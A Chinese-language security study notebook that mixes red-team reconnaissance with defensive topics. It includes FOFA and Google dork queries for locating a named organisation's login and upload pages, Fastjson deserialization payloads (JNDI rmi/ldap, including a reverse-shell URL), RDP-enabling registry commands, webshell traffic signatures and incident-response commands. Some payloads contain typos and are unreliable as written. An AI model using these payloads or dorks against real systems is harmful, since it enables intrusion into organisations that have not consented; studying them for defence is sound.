红队打点前准备

1.环境安装在虚拟机中，不要留有个人的相关信息

2.虚拟机和物理机隔断，虚拟机走代理上网，物理机断网

3.使用无痕模式浏览器，安装jsonp请求插件

4.动态IP代理池

5.从目标机器上下载文件放到断网虚拟机中

6.每日重置攻击环境



日志分析之IIS

打开IIS日志，win+R运行打开inetmgr

IIS日志不会记录POST的请求的内容，因为被默认为不安全的请求类型。

如果你想开启记录请求体的内容，则开启asp.net的request.querystring集合



Weblogic防御

禁用T3协议和IIOP协议，大多数漏洞都是基于这两个协议触发的。



命令

lsof -i :端口号	#查看占用端口的进程PID

ps aux | grep "进程PID"	#查看进程服务信息

awk -F: '{if($3==0) print $1}' /etc/passwd	#查看ID=0的有root权限的用户

cat etc/passwd | /grep /bin/bash	#查看可以登录ssh的用户

last 		#显示最近登录用户，会显示登录源ip

cat /var/log/secure 	#查看日志，记录的是与系统安全相关的事件，例如SSH登录尝试、sudo命令使用等



高效信息收集打点

组织架构收集：目标单位官网收集，例如总部部门及相关机构，分部，省公司，分公司，直属单位等等。天眼查子公司，控股公司等等。了解你的目标，以及目标所属行业，不同行业打法不同。

fofa快速找登录口

“大兴机场"&country="CN"&&region!="HK"&&region!="TW"&&region!="MO"&&(title="登录"‖title="系统"‖title-="后台"‖title="平台"‖tite="管理"‖title-="入口")

(title="登录" || title="系统" || title="后台" || title="平台" || title="管理" || title="入口") && country!="CN"

“大兴机场”&&(app="泛微-协同办公OA"‖app="用友-GRP.U8"‖app="用友-U8"‖app="用友-UFIDA-NC"‖app="致远互联-OA"‖app="TDXK-通达OA"‖app="Landray-OA系统“）



谷歌hack语法
查找后台地址：site:域名 inurl:login|admin|manage memberladmin_loginllogin_admin|system|login|user main|cms
查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统帐号ladmin|login|sys|managetem|password|username
查找可注入点：site:域名 inurl:aspx| jsp | php| asp
查找上传漏洞：site:域名 inurl:file|load|editor|Files
找eweb编辑器：site:域名 inurl:ewebeditor | editor | uploadfile | eweb | edit
存在的数据库：site:域名 filetype:mdb | asp|#
查看脚本类型：site:域名 filetype:asp |aspx |php |jsp
迂回策略入侵：inurl:cms/data/templates/images/index/



fastjson漏洞（java组件）

fastjsonPOC合集：[safe6Sec/Fastjson: Fastjson姿势技巧集合 (github.com)](https://github.com/safe6Sec/Fastjson)

POC

content-type:applocation/json

```null
[
	{
		"a":"a\x]
#字符dos攻击,延迟类型的payload，服务器响应出错或者明显变慢就是fastjson
```

```
{"@type":"java.net.InetAddress","val":"dnslog"}
# fastjson<1.2.48 ,DNS类payload，原生域名解析dnslog,适用范围广
```

```
{"name":"sec" ; {"@type":"java.lang.AutoCloseable" ; "a" ; a
#报错类payload,畸形的json,想确定fastjson版本就用这类
```

EXP(<=1.2.24)结合JNDIExploit1.4

```
{"@type":"com.sun.rowsetJdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName","autoCommit":true}

{"@type":"com.alibaba.fastison.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetlmpl","dataSourceName":"rmi://127.0.0.1:8088/badClassName","autoCommit":true"}}

#url可以填rmi或者ldap,rmi-->http ladp-->ldap,查看JNDIExploit1.4的使用帮助，构造url进行命令执行或者反弹shell如:ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/9999
```

当payload不管用时，可尝试以下方法重新构造payload

![image-20240522205455676](C:\Users\Yitai\AppData\Roaming\Typora\typora-user-images\image-20240522205455676.png)



fastjson<1.2.47

```
{
"a":{
	"@type":"java.lang.Class",
	"val":"com.sun.rowset.JdbcRowSetImpl"
	},
"br":{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://localhost:808/badNameclass",
	"autoCommit":true
 	}
}
```

fastjson高版本

版本>=1.2.48，默认关闭Autotype功能，启动黑白名单防护

![image-20240522211853168](C:\Users\Yitai\AppData\Roaming\Typora\typora-user-images\image-20240522211853168.png)



windows文件下载命令

certutil

启用3389端口桌面连接命令

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

关闭3389桌面连接

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000001 /f

查询远程桌面连接的端口号

REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\winStations\RDP-Tcp" /V PortNumber

3389的16进制-->0xd3d

3389连不上原因
1.3389端口号修改了
2.3389没开
3.有些用户没有rdp权限



Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–>AES解密–>反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–>AES加密–>Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。

Struts 2 使用 Object-Graph Navigation Language（OGNL）作为其默认的表达式语言，用于在视图和控制器之间进行数据交换。攻击者可以构造恶意的OGNL表达式，通过Web请求传递到Struts 2框架中。

 Apache log4j2-RCE 漏洞是由于Log4j2提供的lookup功能下的Jndi ==Lookup==模块出现问题所导致的，==该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。



蚁剑流量特征

漏洞参数pass的开头为@ini_set("display_errors", "0")

如：pass=@ini_set("display_errors", "0")xxxxxxxxxxxxx



冰蝎流量特征

固定的请求头和响应头

请求字节头：

dFAXQV1LORcHRQtLRlwMAhwFTAg/M

响应字节头：

TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd



WebShell检测与查杀

在线检测：[阿里云恶意文件检测平台 - 首页 (aliyun.com)](https://ti.aliyun.com/#/overview)、[SHELLPUB.COM在线查杀](https://n.shellpub.com/)河马在线查杀

查杀：[http://www.d99net.net﻿](http://www.d99net.net/) D盾（只支持W）

[https://www.shellpub.com](https://www.shellpub.com/) 河马（支持W、L、M）



##### windows和linux查找天内被修改的.jsp文件

power shell

Get-ChildItem -Path "C:\phpStudy\PHPTutorial\WWW\DVWA" -Recurse -Filter "*.php" | Where-Object { $_.LastWriteTime -ge (Get-Date).AddDays(-1) }

linux

find /path/to/your/webapp -name "*.jsp" -mtime -1



##### windows和linux查找一天内被访问过的.jsp文件

Get-ChildItem -Path "C:\phpStudy\PHPTutorial\WWW\DVWA" -Recurse -Filter "*.jsp" | Where-Object { $_.LastAccessTime -ge (Get-Date).AddDays(-1) }



find /path/to/your/webapp -name "*.jsp" -atime -1



java内存马查杀工具

[c0ny1/java-memshell-scanner: 通过jsp脚本扫描java web Filter/Servlet型内存马 (github.com)](https://github.com/c0ny1/java-memshell-scanner)
